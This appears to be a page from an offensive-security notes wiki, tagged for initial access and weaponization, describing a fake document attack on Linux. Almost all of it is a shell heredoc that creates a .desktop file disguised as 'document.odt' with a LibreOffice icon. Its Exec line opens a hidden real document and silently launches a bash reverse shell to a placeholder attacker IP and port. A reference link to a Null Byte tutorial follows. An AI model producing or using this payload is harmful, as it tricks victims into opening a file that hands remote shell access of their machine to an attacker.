---
author(s):
  - Userware
tags:
  - initial-access
  - weaponization
  - client-side-attacks
  - linux
credits:
  - tokyoneon
---
# Manual

## Fake Document

```
$ cat > malicious_document.desktop << EOF
#!/usr/bin/env xdg-open

[Desktop Entry]
Encoding=UTF-8
Name=document.odt
Exec=libreoffice --writer $(pwd)/.real_document.odt; /bin/bash -i >& /dev/tcp/<attacker_IP>/<attacker_PORT> 0>&1 &
Terminal=false
Type=Application
Icon=libreoffice-writer
EOF
```

---
## References

### Backlinks

- [[Desktop Files|Helpers: Desktop Files]]

### Null Byte

- [Null Byte: Pop a Reverse Shell with a Video File by Exploiting Popular Linux File Managers](https://null-byte.wonderhowto.com/how-to/pop-reverse-shell-with-video-file-by-exploiting-popular-linux-file-managers-0196078)